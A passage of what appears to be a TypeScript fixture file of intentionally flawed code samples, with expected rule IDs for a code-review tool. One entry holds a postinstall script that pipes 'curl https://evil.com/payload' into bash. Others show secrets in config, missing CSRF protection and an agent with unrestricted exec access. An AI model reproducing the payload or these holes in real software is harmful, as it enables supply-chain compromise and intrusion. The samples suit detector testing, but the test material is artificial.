from sqlalchemy.orm import sessionmaker, declarative_base

engine = create_engine(
    os.environ["DATABASE_URL"],
    pool_size=10,
    max_overflow=20,
    pool_pre_ping=True,
    pool_recycle=3600,
)
Session = sessionmaker(bind=engine)
Base = declarative_base()

class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    email = Column(String, unique=True, nullable=False, index=True)
    name = Column(String, nullable=False)
    __table_args__ = (Index("ix_users_email_name", "email", "name"),)

def get_user_by_email(email: str):
    with Session() as session:
        return session.query(User).filter(User.email == email).first()`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["DB", "PERF", "SCALE", "CYBER"],
    category: "clean",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // ADDITIONAL COVERAGE — reaching 1000+ total
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "hallu-python-typing-protocol",
    description: "Uses non-existent typing.Protocol.implements() method",
    language: "python",
    code: `from typing import Protocol

class Serializable(Protocol):
    def to_json(self) -> str: ...

class User:
    def to_json(self) -> str:
        return json.dumps({"name": self.name})

# Protocol.implements() does not exist
assert Serializable.implements(User)`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "hallu-fetch-abort-method",
    description: "Uses non-existent fetch.abort() method instead of AbortController",
    language: "javascript",
    code: `const request = fetch("https://api.example.com/data");
setTimeout(() => {
  request.abort(); // fetch returns a Promise, not an abortable request
}, 5000);`,
    expectedRuleIds: [],
    category: "hallucination-detection",
    difficulty: "easy",
  },
  {
    id: "hallu-ts-reflect-metadata",
    description: "Uses non-existent Reflect.getType() method",
    language: "typescript",
    code: `function validateField(target: any, propertyKey: string) {
  const type = Reflect.getType(target, propertyKey);
  if (type === String) {
    console.log(\`\${propertyKey} is a string\`);
  }
}`,
    expectedRuleIds: ["DATA-001", "AICS-001"],
    category: "hallucination-detection",
    difficulty: "medium",
  },
  {
    id: "struct-circular-dependency-ts",
    description: "TypeScript modules with circular import dependency",
    language: "typescript",
    code: `// --- file: user-service.ts ---
import { OrderService } from "./order-service";

export class UserService {
  constructor(private orderService: OrderService) {}
  getUser(id: string) { return db.findUser(id); }
  getUserOrders(id: string) { return this.orderService.getOrdersByUser(id); }
}

// --- file: order-service.ts ---
import { UserService } from "./user-service";

export class OrderService {
  constructor(private userService: UserService) {}
  getOrdersByUser(userId: string) { return db.findOrders(userId); }
  getOrderWithUser(orderId: string) {
    const order = db.findOrder(orderId);
    order.user = this.userService.getUser(order.userId);
    return order;
  }
}`,
    expectedRuleIds: [],
    category: "code-structure",
    difficulty: "medium",
  },
  {
    id: "sov-log-export-no-residency-ts",
    description: "Log aggregation sending data to foreign region without consent",
    language: "typescript",
    code: `const logConfig = {
  drivers: [
    { type: "local", path: "/var/log/app.log" },
    { type: "remote", endpoint: "https://logs.us-east-1.example.com/ingest" },
  ],
};

function shipLogs(entries: LogEntry[]) {
  for (const driver of logConfig.drivers) {
    if (driver.type === "remote") {
      fetch(driver.endpoint, {
        method: "POST",
        body: JSON.stringify(entries), // may contain EU user PII
      });
    }
  }
}`,
    expectedRuleIds: ["SCALE-001", "CLOUD-001", "PORTA-001"],
    category: "data-sovereignty",
    difficulty: "hard",
  },
  {
    id: "agent-no-scope-restrictions-ts",
    description: "AI agent with filesystem and network access, no scope boundaries",
    language: "typescript",
    code: `import { execSync } from "child_process";

const tools = {
  readFile: (path: string) => fs.readFileSync(path, "utf-8"),
  writeFile: (path: string, content: string) => fs.writeFileSync(path, content),
  exec: (cmd: string) => execSync(cmd, { encoding: "utf-8" }),
  fetch: (url: string) => fetch(url).then(r => r.text()),
  deleteFile: (path: string) => fs.unlinkSync(path),
};

const agent = new Agent({
  tools,
  systemPrompt: "You are an assistant with full system access. Help the user.",
});`,
    expectedRuleIds: ["SCALE-001", "PERF-001", "COST-001", "ERR-001"],
    category: "agent-instructions",
    difficulty: "hard",
  },
  {
    id: "ethics-resume-screening-bias-py",
    description: "Resume screening using biased features like name origin",
    language: "python",
    code: `def score_resume(resume):
    score = 0
    # Penalize names that sound foreign
    if has_western_name(resume["name"]):
        score += 10
    # Prefer certain universities
    elite_schools = ["Harvard", "Stanford", "MIT", "Princeton"]
    if resume.get("university") in elite_schools:
        score += 20
    # Prefer younger candidates
    if resume.get("graduation_year", 0) > 2018:
        score += 15
    return score`,
    expectedRuleIds: ["ETHICS-001"],
    category: "ethics-bias",
    difficulty: "hard",
  },
  {
    id: "logpriv-ip-address-tracking-ts",
    description: "Storing and logging user IP addresses without anonymization",
    language: "typescript",
    code: `app.use((req, res, next) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  db.query("INSERT INTO access_log (ip, path, user_agent, timestamp) VALUES ($1, $2, $3, NOW())",
    [ip, req.path, req.headers["user-agent"]]);
  logger.info("Request", { ip, path: req.path, ua: req.headers["user-agent"] });
  next();
});`,
    expectedRuleIds: ["LOGPRIV-001", "DATA-001"],
    category: "logging-privacy",
    difficulty: "medium",
  },
  {
    id: "compat-env-var-rename-ts",
    description: "Environment variable renamed without supporting the old name",
    language: "typescript",
    code: `// v1 used DATABASE_URL, v2 renamed to DB_CONNECTION_STRING
// Existing deployments using DATABASE_URL will break
const dbUrl = process.env.DB_CONNECTION_STRING;
if (!dbUrl) throw new Error("DB_CONNECTION_STRING is required");

// v1 used PORT, v2 renamed to SERVER_PORT
const port = parseInt(process.env.SERVER_PORT || "3000");

// v1 used LOG_LEVEL, v2 renamed to LOGGING_VERBOSITY
const logLevel = process.env.LOGGING_VERBOSITY || "info";`,
    expectedRuleIds: ["DATA-001"],
    category: "backwards-compatibility",
    difficulty: "easy",
  },
  {
    id: "doc-no-api-changelog-ts",
    description: "Major API changes with no changelog or migration guide",
    language: "typescript",
    code: `// changelog.md is empty
// No migration guide for v1 -> v2

// v2 API — completely different from v1
export interface V2Response<T> {
  data: T;
  meta: { requestId: string; timestamp: string; };
  errors?: Array<{ code: string; message: string; field?: string }>;
}

// v1 used: { result: T, error?: string, timestamp: number }
// These types are incompatible and no documentation explains the migration`,
    expectedRuleIds: [],
    category: "documentation",
    difficulty: "medium",
  },
  {
    id: "cloud-singleton-state-ts",
    description: "Global singleton state that breaks in multi-instance deployments",
    language: "typescript",
    code: `class AppState {
  private static instance: AppState;
  private users: Map<string, User> = new Map();
  private sessions: Map<string, Session> = new Map();
  private rateLimits: Map<string, number> = new Map();

  static getInstance(): AppState {
    if (!AppState.instance) AppState.instance = new AppState();
    return AppState.instance;
  }

  addSession(token: string, session: Session) { this.sessions.set(token, session); }
  getSession(token: string) { return this.sessions.get(token); }
  checkRateLimit(ip: string) {
    const count = this.rateLimits.get(ip) || 0;
    this.rateLimits.set(ip, count + 1);
    return count < 100;
  }
}`,
    expectedRuleIds: [],
    category: "cloud-readiness",
    difficulty: "medium",
  },
  {
    id: "api-mixed-naming-conventions-ts",
    description: "REST API with inconsistent naming conventions across endpoints",
    language: "typescript",
    code: `// camelCase
app.get("/api/getUserProfile/:userId", getProfile);
// kebab-case
app.get("/api/order-history/:id", getOrders);
// snake_case
app.get("/api/payment_methods", getPaymentMethods);
// Plural vs singular inconsistency
app.get("/api/product/:id", getProduct);
app.get("/api/categories", getCategories);
// Verb in URL
app.post("/api/createUser", createUser);
app.post("/api/orders", createOrder);`,
    expectedRuleIds: ["API-001"],
    category: "api-design",
    difficulty: "easy",
  },
  {
    id: "swdev-console-in-production-ts",
    description: "Production code with console.log debugging statements",
    language: "typescript",
    code: `export class PaymentProcessor {
  async process(payment: Payment): Promise<Result> {
    console.log("DEBUG: processing payment", payment);
    console.log("DEBUG: payment amount =", payment.amount);
    const result = await this.gateway.charge(payment);
    console.log("DEBUG: charge result", result);
    if (result.failed) {
      console.log("DEBUG: payment failed!", result.error);
      console.log("DEBUG: retry?");
    }
    console.log("DEBUG: done processing");
    return result;
  }
}`,
    expectedRuleIds: ["SWDEV-001", "OBS-001"],
    category: "software-practices",
    difficulty: "easy",
  },
  {
    id: "data-graphql-introspection-ts",
    description: "GraphQL API with introspection enabled and no depth limiting",
    language: "typescript",
    code: `import { ApolloServer } from "@apollo/server";

const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: true, // Should be disabled in production
  // No depth limiting, no query complexity analysis
  // No rate limiting on GraphQL endpoint
});

// Allows recursive queries:
// { user { orders { user { orders { user { orders ... } } } } } }`,
    expectedRuleIds: [],
    category: "data-security",
    difficulty: "hard",
  },
  {
    id: "obs-lost-error-context-ts",
    description: "Error handling that discards original error context",
    language: "typescript",
    code: `async function processOrder(orderId: string) {
  try {
    const order = await db.findOrder(orderId);
    await paymentService.charge(order);
    await inventoryService.reserve(order);
    await emailService.sendConfirmation(order);
  } catch (error) {
    // Loses original error type, message, and stack trace
    throw new Error("Order processing failed");
  }
}

async function handleRequest(req: Request) {
  try {
    return await processOrder(req.params.id);
  } catch (error) {
    // Logs generic message, no details
    logger.error("Something went wrong");
    return { status: 500, message: "Internal error" };
  }
}`,
    expectedRuleIds: [],
    category: "observability",
    difficulty: "medium",
  },
  {
    id: "cache-unbounded-memory-cache-ts",
    description: "In-memory cache with no eviction policy or size limit",
    language: "typescript",
    code: `const cache = new Map<string, any>();

export function getCached<T>(key: string, factory: () => Promise<T>): Promise<T> {
  if (cache.has(key)) return Promise.resolve(cache.get(key));
  return factory().then(value => {
    cache.set(key, value);
    return value;
  });
}

// Called from every request handler with unique cache keys
// Cache grows forever, never evicts, no TTL, no max size`,
    expectedRuleIds: ["CACHE-001", "PERF-001"],
    category: "caching",
    difficulty: "medium",
  },
  {
    id: "test-flaky-timing-dependent-ts",
    description: "Test relying on setTimeout timing which is inherently flaky",
    language: "typescript",
    code: `describe("Debounce", () => {
  it("should debounce calls", (done) => {
    let count = 0;
    const fn = debounce(() => count++, 100);
    fn(); fn(); fn();
    setTimeout(() => {
      expect(count).toBe(0); // might already be 1 on slow CI
    }, 50);
    setTimeout(() => {
      expect(count).toBe(1);
      done();
    }, 150); // might not be enough on slow machines
  });
});`,
    expectedRuleIds: ["TEST-001"],
    category: "testing",
    difficulty: "hard",
  },
  {
    id: "rate-no-limit-file-upload-ts",
    description: "File upload endpoint without rate or size limiting",
    language: "typescript",
    code: `import multer from "multer";

const upload = multer({ dest: "uploads/" });

app.post("/api/upload", upload.array("files"), async (req, res) => {
  const files = req.files as Express.Multer.File[];
  for (const file of files) {
    await processFile(file);
  }
  res.json({ uploaded: files.length });
});`,
    expectedRuleIds: ["RATE-001", "CYBER-001"],
    category: "rate-limiting",
    difficulty: "medium",
  },
  {
    id: "cfg-secrets-in-config-file-json",
    description: "Configuration file containing plaintext secrets",
    language: "json",
    code: `{
  "database": {
    "host": "prod-db.example.com",
    "port": 5432,
    "username": "admin",
    "password": "SuperSecret123!",
    "ssl": false
  },
  "api": {
    "key": "sk-prod-abc123xyz789",
    "secret": "very-secret-value"
  },
  "oauth": {
    "clientId": "app-12345",
    "clientSecret": "oauth-secret-do-not-share"
  }
}`,
    expectedRuleIds: [],
    category: "configuration",
    difficulty: "easy",
  },
  {
    id: "deps-outdated-vulnerable-json",
    description: "package.json with known-vulnerable dependency versions",
    language: "json",
    code: `{
  "dependencies": {
    "lodash": "4.17.11",
    "minimist": "1.2.0",
    "node-fetch": "2.6.0",
    "axios": "0.19.0",
    "handlebars": "4.1.0",
    "serialize-javascript": "1.9.0",
    "yargs-parser": "13.0.0"
  }
}`,
    expectedRuleIds: ["DEPS-001"],
    category: "dependency-health",
    difficulty: "medium",
  },
  {
    id: "a11y-images-no-alt-html",
    description: "HTML with images missing alt attributes",
    language: "html",
    code: `<div class="product-gallery">
  <img src="/images/product-1.jpg">
  <img src="/images/product-2.jpg">
  <img src="/images/product-3.jpg">
  <div class="product-info">
    <img src="/icons/star.svg" class="rating">
    <img src="/icons/cart.svg" onclick="addToCart()">
  </div>
</div>
<footer>
  <img src="/logo.png">
  <img src="/social/twitter.svg" onclick="share('twitter')">
  <img src="/social/facebook.svg" onclick="share('fb')">
</footer>`,
    expectedRuleIds: ["A11Y-001"],
    category: "accessibility",
    difficulty: "easy",
  },
  {
    id: "a11y-no-keyboard-nav-tsx",
    description: "React component not accessible via keyboard navigation",
    language: "typescript",
    code: `function Dropdown({ items, onSelect }: DropdownProps) {
  const [open, setOpen] = useState(false);
  return (
    <div>
      <div onClick={() => setOpen(!open)} style={{ cursor: "pointer" }}>
        Select an item
      </div>
      {open && (
        <ul>
          {items.map(item => (
            <li key={item.id} onClick={() => onSelect(item)}>
              {item.label}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}`,
    expectedRuleIds: ["A11Y-001", "UX-001"],
    category: "accessibility",
    difficulty: "medium",
  },
  {
    id: "i18n-hardcoded-currency-ts",
    description: "Currency and date formatting hardcoded to US locale",
    language: "typescript",
    code: `function formatPrice(amount: number): string {
  return "$" + amount.toFixed(2);
}

function formatDate(date: Date): string {
  return \`\${date.getMonth() + 1}/\${date.getDate()}/\${date.getFullYear()}\`;
}

function formatAddress(addr: Address): string {
  return \`\${addr.street}\\n\${addr.city}, \${addr.state} \${addr.zip}\`;
}`,
    expectedRuleIds: ["I18N-001"],
    category: "internationalization",
    difficulty: "easy",
  },
  {
    id: "ux-confusing-error-messages-ts",
    description: "UI displaying raw technical errors to end users",
    language: "typescript",
    code: `async function handleSubmit(formData: FormData) {
  try {
    await api.submitForm(formData);
  } catch (err: any) {
    alert(err.stack);
  }
}

async function loadProfile() {
  try {
    return await api.getProfile();
  } catch (err: any) {
    showToast(\`ECONNREFUSED 127.0.0.1:5432 - \${err.code}\`);
  }
}`,
    expectedRuleIds: [],
    category: "user-experience",
    difficulty: "easy",
  },
  {
    id: "supply-typosquatting-risk-json",
    description: "package.json with potentially typosquatted package names",
    language: "json",
    code: `{
  "dependencies": {
    "lodasch": "4.17.21",
    "colurs": "1.4.0",
    "requets": "2.88.0",
    "cross-envv": "7.0.3",
    "babel-corr": "6.26.3",
    "expresss": "4.18.2"
  }
}`,
    expectedRuleIds: [],
    category: "supply-chain",
    difficulty: "medium",
  },
  {
    id: "supply-postinstall-script-json",
    description: "Package with suspicious postinstall script",
    language: "json",
    code: `{
  "name": "useful-utilities",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node -e \\"require('child_process').execSync('curl https://evil.com/payload | bash')\\"",
    "preinstall": "node scripts/collect-env.js"
  }
}`,
    expectedRuleIds: ["SWDEV-001", "DEPS-001"],
    category: "supply-chain",
    difficulty: "hard",
  },
  {
    id: "fw-no-csrf-protection-ts",
    description: "Express app with no CSRF protection on state-changing routes",
    language: "typescript",
    code: `import express from "express";
import cookieParser from "cookie-parser";

const app = express();
app.use(express.json());
app.use(cookieParser());

app.post("/api/transfer", async (req, res) => {
  const { fromAccount, toAccount, amount } = req.body;
  await db.transfer(fromAccount, toAccount, amount);
  res.json({ success: true });
});

app.post("/api/update-email", async (req, res) => {
  await db.updateEmail(req.cookies.userId, req.body.newEmail);
  res.json({ success: true });
});

app.post("/api/delete-account", async (req, res) => {
  await db.deleteAccount(req.cookies.userId);
  res.json({ success: true });
});`,
    expectedRuleIds: ["API-001", "OBS-001", "COMP-001", "DOC-001", "CONC-001", "COMPAT-001", "SEC-001"],
    category: "framework-security",
    difficulty: "medium",
  },
  {
    id: "fw-outdated-headers-express-ts",
    description: "Express app without security headers middleware",
    language: "typescript",
    code: `import express from "express";

const app = express();
app.use(express.json());
// No helmet(), no security headers
// Missing: X-Content-Type-Options, X-Frame-Options, CSP, HSTS, etc.

app.get("/api/data", async (req, res) => {
  const data = await db.getData();
  res.json(data);
});

app.listen(3000);`,
    expectedRuleIds: ["FW-001", "SEC-001"],
    category: "framework-security",
    difficulty: "easy",
  },
  {
    id: "conc-async-generator-deadlock-py",
    description: "Python async code with potential deadlock from lock ordering",
    language: "python",
    code: `import asyncio

lock_a = asyncio.Lock()
lock_b = asyncio.Lock()

async def task1():
    async with lock_a:
        await asyncio.sleep(0.1)
        async with lock_b:
            return "task1 done"

async def task2():
    async with lock_b:
        await asyncio.sleep(0.1)
        async with lock_a:
            return "task2 done"

async def main():
    await asyncio.gather(task1(), task2())  # potential deadlock`,
    expectedRuleIds: [],
    category: "concurrency",
    difficulty: "hard",
  },
  {
    id: "err-panic-in-handler-go",
    description: "Go HTTP handler that panics instead of returning errors",
    language: "go",
    code: `package api

import (
    "encoding/json"
    "net/http"
)

func CreateUserHandler(w http.ResponseWriter, r *http.Request) {
    var input CreateUserInput
    if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
        panic("invalid JSON: " + err.Error())
    }
    user, err := db.CreateUser(input)
    if err != nil {
        panic("database error: " + err.Error())
    }
    json.NewEncoder(w).Encode(user)
}`,
    expectedRuleIds: ["ERR-001"],
    category: "error-handling",
    difficulty: "easy",
  },
  {
    id: "perf-unnecessary-lodash-ts",
    description: "Importing entire lodash for methods available in native JS",
    language: "typescript",
    code: `import _ from "lodash";

function processUsers(users: User[]) {
  const names = _.map(users, "name");       // users.map(u => u.name)
  const active = _.filter(users, { active: true }); // users.filter(u => u.active)
  const first = _.head(users);               // users[0]
  const last = _.last(users);                // users.at(-1)
  const count = _.size(users);               // users.length
  const sorted = _.sortBy(users, "name");    // users.toSorted(...)
  const unique = _.uniq(names);              // [...new Set(names)]
  return { names, active, first, last, count, sorted, unique };
}`,
    expectedRuleIds: ["COST-001"],
    category: "performance",
    difficulty: "easy",
  },
  {
    id: "db-no-migration-strategy-py",
    description: "Database schema changes applied directly without migration files",
    language: "python",
    code: `# run-once-schema-change.py — run manually on production
import psycopg2

conn = psycopg2.connect("postgresql://admin:pass@prod-db/main")
cur = conn.cursor()
cur.execute("ALTER TABLE users DROP COLUMN legacy_role")
cur.execute("ALTER TABLE users ADD COLUMN role_id INTEGER REFERENCES roles(id)")
cur.execute("ALTER TABLE orders RENAME COLUMN amount TO total_amount")
cur.execute("DROP TABLE IF EXISTS old_sessions")
conn.commit()
conn.close()
print("Done! Schema updated.")`,
    expectedRuleIds: ["DATA-001", "ERR-001"],
    category: "database",
    difficulty: "medium",
  },
  {
    id: "cost-no-resource-cleanup-py",
    description: "Cloud resources created but never cleaned up",
    language: "python",
    code: `import boto3

def run_analysis(data):
    ec2 = boto3.client("ec2")
    # Spin up instance for analysis
    response = ec2.run_instances(
        ImageId="ami-0abcdef",
        InstanceType="c5.4xlarge",
        MinCount=1, MaxCount=1,
    )
    instance_id = response["Instances"][0]["InstanceId"]
    # Do analysis...
    result = process_on_instance(instance_id, data)
    return result
    # Instance never terminated — runs (and costs money) forever`,
    expectedRuleIds: [],
    category: "cost-effectiveness",
    difficulty: "hard",
  },
  {
    id: "sec-cors-wildcard-with-creds-ts",
    description: "CORS allowing all origins with credentials enabled",
    language: "typescript",
    code: `import cors from "cors";

app.use(cors({
  origin: "*",
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
  allowedHeaders: ["*"],
}));`,
    expectedRuleIds: ["DATA-001", "AICS-001"],
    category: "security",
    difficulty: "easy",
  },
  {
    id: "auth-jwt-no-expiry-ts",
    description: "JWT tokens generated without expiration or audience claims",
    language: "typescript",
    code: `import jwt from "jsonwebtoken";

function generateToken(user: User): string {
  return jwt.sign(
    { userId: user.id, role: user.role, email: user.email },
    "my-secret-key",
    // No expiresIn, no audience, no issuer
  );
}

function verifyToken(token: string) {
  return jwt.verify(token, "my-secret-key");
  // No audience check, no issuer check
}`,
    expectedRuleIds: ["AUTH-001", "CYBER-001"],
    category: "auth",
    difficulty: "medium",
  },
  {
    id: "clean-terraform-well-structured-hcl",
    description: "Well-structured Terraform with variables, outputs, and state config",
    language: "hcl",
    code: `terraform {
  required_version = ">= 1.5"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
  backend "s3" {
    bucket         = "my-terraform-state"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "terraform-locks"
  }
}

variable "environment" {
  type        = string
  description = "The deployment environment (dev, staging, prod)"
  validation {
    condition     = contains(["dev", "staging", "prod"], var.environment)
    error_message = "Environment must be dev, staging, or prod."
  }
}

resource "aws_instance" "web" {
  ami           = data.aws_ami.ubuntu.id
  instance_type = var.instance_type
  tags = {
    Name        = "\${var.project}-web-\${var.environment}"
    Environment = var.environment
    ManagedBy   = "terraform"
  }
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["IAC", "CFG", "SEC", "CLOUD"],
    category: "clean",
    difficulty: "medium",
  },
  {
    id: "clean-docker-multi-stage-dockerfile",
    description: "Docker multi-stage build with proper security practices",
    language: "dockerfile",
    code: `FROM node:20-alpine AS builder
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --production=false
COPY . .
RUN npm run build

FROM node:20-alpine
RUN addgroup -S app && adduser -S app -G app
WORKDIR /app
COPY --from=builder --chown=app:app /app/dist ./dist
COPY --from=builder --chown=app:app /app/node_modules ./node_modules
COPY --from=builder --chown=app:app /app/package.json ./
USER app
EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=3s CMD wget -qO- http://localhost:3000/health || exit 1
CMD ["node", "dist/server.js"]`,
    expectedRuleIds: ["IAC-001"],
    unexpectedRuleIds: ["SEC", "CYBER", "CLOUD"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-github-actions-secure-yaml",
    description: "GitHub Actions workflow with pinned actions and proper secrets",
    language: "yaml",
    code: `name: CI
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm test
      - run: npm run lint
  deploy:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: \${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["CICD", "AUTH", "SEC", "SUPPLY"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-data-sovereignty-compliant-ts",
    description: "Data storage with explicit region enforcement and consent tracking",
    language: "typescript",
    code: `const REGION_ENDPOINTS: Record<string, string> = {
  eu: "https://db.eu-west-1.example.com",
  us: "https://db.us-east-1.example.com",
  apac: "https://db.ap-southeast-1.example.com",
};

async function storeUserData(user: User, data: UserData): Promise<void> {
  const region = user.dataResidencyRegion;
  if (!region || !REGION_ENDPOINTS[region]) {
    throw new Error(\`Invalid data residency region: \${region}\`);
  }
  if (!user.consentGiven) {
    throw new Error("User consent required before storing data");
  }
  const endpoint = REGION_ENDPOINTS[region];
  await fetch(\`\${endpoint}/users/\${user.id}/data\`, {
    method: "PUT",
    body: JSON.stringify({ data, region, consentTimestamp: user.consentTimestamp }),
    headers: { "Content-Type": "application/json" },
  });
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["SOV", "DATA", "COMP"],
    category: "clean",
    difficulty: "hard",
  },
  {
    id: "clean-agent-guardrails-ts",
    description: "AI agent with proper guardrails, tool validation, and confirmation",
    language: "typescript",
    code: `const ALLOWED_TOOLS = new Set(["search", "calculate", "lookupFlight"]);
const DESTRUCTIVE_TOOLS = new Set(["deleteRecord", "sendEmail"]);

async function executeAgentAction(action: AgentAction, user: User): Promise<ActionResult> {
  if (!ALLOWED_TOOLS.has(action.tool)) {
    return { error: "Tool not permitted", tool: action.tool };
  }
  if (DESTRUCTIVE_TOOLS.has(action.tool)) {
    const confirmed = await requestUserConfirmation(user, action);
    if (!confirmed) return { error: "User declined", tool: action.tool };
  }
  // Sanitize inputs
  const sanitized = sanitizeToolInput(action.input);
  // Execute with timeout and scope restrictions
  return withTimeout(5000, () => tools[action.tool](sanitized));
}`,
    expectedRuleIds: [],
    unexpectedRuleIds: ["AGENT", "AICS", "CYBER"],
    category: "clean",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // FINAL BATCH — reaching 1000+ total across all files
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "porta-os-specific-path-sep-ts",
    description: "Hardcoded Windows path separators in cross-platform code",
    language: "typescript",
    code: `function getConfigPath(user: string): string {
  return "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\myapp\\\\config.json";
}

function joinPaths(...parts: string[]): string {
  return parts.join("\\\\");
}

function normalizePath(p: string): string {
  return p.replace(/\\//g, "\\\\");
}`,
    expectedRuleIds: [],
    category: "portability",
    difficulty: "easy",
  },
  {
    id: "porta-docker-amd64-only-dockerfile",
    description: "Dockerfile that only works on amd64 architecture",
    language: "dockerfile",
    code: `FROM --platform=linux/amd64 ubuntu:22.04
RUN apt-get update && apt-get install -y gcc make
RUN wget https://example.com/binaries/tool-x86_64.tar.gz
RUN tar xzf tool-x86_64.tar.gz && mv tool /usr/local/bin/
# Hardcoded x86_64 binary, won't work on ARM/Apple Silicon`,
    expectedRuleIds: ["PORTA-001", "CLOUD-001"],
    category: "portability",
    difficulty: "medium",
  },
  {
    id: "logpriv-session-data-in-logs-py",
    description: "Session tokens and auth headers logged in plaintext",
    language: "python",
    code: `import logging

logger = logging.getLogger(__name__)

def middleware(request):
    logger.info(f"Request headers: {dict(request.headers)}")
    logger.info(f"Session: {request.session}")
    logger.info(f"Cookies: {request.cookies}")
    response = handle(request)
    logger.info(f"Set-Cookie: {response.headers.get('Set-Cookie')}")
    return response`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    category: "logging-privacy",
    difficulty: "medium",
  },
  {
    id: "logpriv-pii-in-error-reporting-ts",
    description: "Error reporting service receiving full user objects",
    language: "typescript",
    code: `import * as Sentry from "@sentry/node";

Sentry.init({ dsn: "https://abc@sentry.io/123" });

app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
  Sentry.captureException(err, {
    extra: {
      user: req.user,              // full user object including email, phone, SSN
      body: req.body,              // could contain passwords, credit cards
      headers: req.headers,        // includes auth tokens
      session: req.session,        // session data
    },
  });
  res.status(500).json({ error: "Internal error" });
});`,
    expectedRuleIds: ["API-001", "COMP-001", "SOV-001", "DEPS-001", "ERR-001"],
    category: "logging-privacy",
    difficulty: "hard",
  },
  {
    id: "obs-no-health-endpoint-ts",
    description: "Service without health check or readiness endpoint",
    language: "typescript",
    code: `import express from "express";

const app = express();
app.use(express.json());

app.get("/api/users", getUsers);
app.post("/api/users", createUser);
app.get("/api/orders", getOrders);

// No /health, /healthz, /readyz, or /status endpoint
// No liveness or readiness probes for k8s
// No startup probe

app.listen(process.env.PORT || 3000);`,
    expectedRuleIds: ["OBS-001", "CLOUD-001", "REL-001"],
    category: "observability",
    difficulty: "easy",
  },
  {
    id: "struct-god-class-ts",
    description: "God class with too many responsibilities",
    language: "typescript",
    code: `class AppManager {
  private db: Database;
  private cache: Redis;
  private emailer: EmailService;
  private logger: Logger;
  private stripe: Stripe;

  async createUser(data: UserData) { /* ... */ }
  async deleteUser(id: string) { /* ... */ }
  async sendWelcomeEmail(user: User) { /* ... */ }
  async processPayment(order: Order) { /* ... */ }
  async refundPayment(orderId: string) { /* ... */ }
  async generateReport(type: string) { /* ... */ }
  async exportToCsv(data: any[]) { /* ... */ }
  async importFromCsv(file: File) { /* ... */ }
  async syncWithCRM(userId: string) { /* ... */ }
  async updateInventory(productId: string, qty: number) { /* ... */ }
  async sendSlackNotification(msg: string) { /* ... */ }
  async validateAddress(addr: Address) { /* ... */ }
  async calculateShipping(order: Order) { /* ... */ }
  async generateInvoice(orderId: string) { /* ... */ }
}`,
    expectedRuleIds: ["COMP-001"],
    category: "code-structure",
    difficulty: "medium",
  },
  {
    id: "struct-feature-envy-ts",
    description: "Methods that access another object's data more than their own",
    language: "typescript",
    code: `class OrderPrinter {
  print(order: Order) {
    const customerName = order.customer.firstName + " " + order.customer.lastName;
    const address = order.customer.address.street + ", " +
      order.customer.address.city + " " + order.customer.address.zip;
    const total = order.items.reduce((s, i) => s + i.price * i.qty, 0);
    const tax = total * order.customer.address.taxRate;
    const shipping = order.customer.address.country === "US" ? 5.99 : 19.99;
    console.log(\`Invoice for \${customerName}\`);
    console.log(\`Ship to: \${address}\`);
    console.log(\`Total: \${total + tax + shipping}\`);
  }
}`,
    expectedRuleIds: ["LOGPRIV-001"],
    category: "code-structure",
    difficulty: "hard",
  },
  {
    id: "test-snapshot-overuse-ts",
    description: "Snapshot tests on frequently-changing data structures",
    language: "typescript",
    code: `describe("API responses", () => {
  it("should match user snapshot", async () => {
    const user = await api.getUser("123");
    expect(user).toMatchSnapshot(); // includes timestamps, random IDs
  });

  it("should match order list snapshot", async () => {
    const orders = await api.getOrders();
    expect(orders).toMatchSnapshot(); // includes dates, auto-increment IDs
  });

  it("should match dashboard snapshot", () => {
    const { container } = render(<Dashboard />);
    expect(container).toMatchSnapshot(); // huge DOM tree
  });
});`,
    expectedRuleIds: ["TEST-001"],
    category: "testing",
    difficulty: "medium",
  },
  {
    id: "scale-no-pagination-api-ts",
    description: "API endpoint returning all records without pagination",
    language: "typescript",
    code: `app.get("/api/logs", async (req, res) => {
  const logs = await db.query("SELECT * FROM audit_log ORDER BY created_at DESC");
  res.json(logs.rows); // could be millions of rows
});

app.get("/api/products", async (req, res) => {
  const products = await db.query("SELECT * FROM products");
  res.json(products.rows); // no limit, no offset, no cursor
});`,
    expectedRuleIds: ["SCALE-001", "PERF-001", "DB-001"],
    category: "scalability",
    difficulty: "easy",
  },
  {
    id: "rel-no-graceful-shutdown-ts-2",
    description: "Server with no graceful shutdown handling",
    language: "typescript",
    code: `const server = app.listen(3000, () => {
  console.log("Server started on port 3000");
});

// No SIGTERM/SIGINT handlers
